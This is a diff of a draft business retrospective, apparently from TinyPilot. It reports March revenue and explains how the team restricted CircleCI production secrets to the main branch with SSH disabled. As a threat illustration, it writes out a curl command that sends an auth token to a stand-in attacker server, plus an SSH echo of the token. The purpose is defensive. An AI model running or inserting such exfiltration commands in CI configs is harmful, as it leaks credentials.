@@ -48,9 +48,54 @@ TODO
 | Total Revenue            | $86,181.77     | $110,542.65   | <font color="green">+$24,360.88 (+28%)</font>   |
 | **Profit**               | **$23,599.09** | **$3,193.73** | **<font color="red">-$20,405.36 (-86%)</font>** |
 
-## Hardening TinyPilot's release process
+March was TinyPilot's strongest month ever of sales revenue, narrowly beating [our previous record](/retrospectives/2022/12/#tinypilothttpstinypilotkvmcomrefmtlynchio-stats) by $600.
 
-https://circleci.com/changelog/expression-based-context-restrictions/
+Visits are down from last month but only because last month had an atypical surge in visits.
+
+## Tightening access to TinyPilot's production secrets
+
+Over the past few months, we've been [improving TinyPilot's release process](/retrospectives/2024/03/#it-turns-out-we-have-a-25-step-release-process) so that it's more automated and less dependent on me specifically.
+
+In reviewing our release workflow, we realized that too many team members had access to production secrets. Production secrets include things like authentication tokens that allow our automated systems to publish new versions of our website or the TinyPilot application.
+
+We're a small team, so in our case, "too many" was five people instead of just one. Still, four people had access to production secrets and didn't need them, so we wanted to lock things down further.
+
+We never store secrets in source. Instead, our secrets are in our continuous integration (CI) system, CircleCI. CI is how we test and deploy our code after it hits our source repository.
+
+Most TinyPilot repositories are "push on green," (TODO: link) meaning that we push every code change to production after it passes our automated tests on CI.
+
+We store our secrets in CircleCI environment variables. This initially seemed fine because environment variables are write-only, meaning that you can't read the values after storing them in CircleCI.
+
+{{<img src="ci-env-vars.webp" has-border="true" max-width="700px" caption="CircleCI's admin interface only shows a portion of the values of environment variables, and only the CircleCI admin can see them. Note that I'm showing synthetic values, as I don't even want to expose a portion of real auth tokens.">}}
+
+Once we started thinking more critically about protecting secrets, we realized that despite what CircleCI's web UI suggested, everyone on the team effectively had access to our environment variables. A malicious team member with access to TinyPilot source code could extract secrets in one of two ways:
+
+1. They could push a change to our CircleCI config file that exfiltrates a secret to a remote server they control like `curl http://attacker-server.example.com/exfiltrate?token=$AUTH_TOKEN`
+1. They could publish an innocuous change, then SSH in to CircleCI and type `echo $AUTH_TOKEN` on the command line.
+
+(1) was semi-possible to detect, but it wasn't something we ever checked. (2) was impossible to detect, as CircleCI doesn't log SSH sessions.
+
+We looked into tightening access, and CircleCI's recommendation was to store security-sensitive secrets in "contexts." Contexts are still environment variables, but CircleCI lets you define more granular access to them.
+
+The problem was that security contexts didn't work with push on green. Security contexts only allowed you restrict access to environment variables to a certain set of people. We wanted to preserve the workflow that all changes approval from at least one teammate, but any two team members could push a change to production.
+
+With CircleCI security contexts, the only way to continue our workflow would be to create a security context that everyone on the team could access, but that brought us back to our original problem.
+
+We reached out to CircleCI support, and they said they were coincidentally working on something that would solve our problem and would release it in a few weeks. Two weeks later, CircleCI released [expression-based context restrictions](https://circleci.com/changelog/expression-based-context-restrictions/), which did, in fact, perfectly solve our problem.
+
+CircleCI's expression-based restrictions allowed us to add restrictions to contexts beyond just an allowlist of users with access. They enabled us to limit access to secrets to our main branch and when SSH is disabled:
+
+```python
+pipeline.git.branch == "master" and not job.ssh.enabled
+```
+
+It solves (1) above because a malicious team member who tries to exfiltrate a secret using a branch would not have access to the secret in that branch.
+
+It solves (2) by just making the secret unavailable when a initiates a CircleCI job with SSH access.
+
+This system is still vulnerable to two team members teaming up to do something malicious. One could introduce a code change that exfiltrates a secret, and their co-conspirator could approve it. But this would be a particularly "loud" attack, as anyone else on the team could observe malicious code in a file we frequently work on, and there'd be a clear audit trail of who put it there.
+
+Overall, I'm happy with CircleCI's expression-based context restrictions. If you're on a team where CI has access to production secrets, I recommend you think about whether too many team members have access to secrets they don't need.
 
 ## Migrating services between hosts badly and then a little better
 
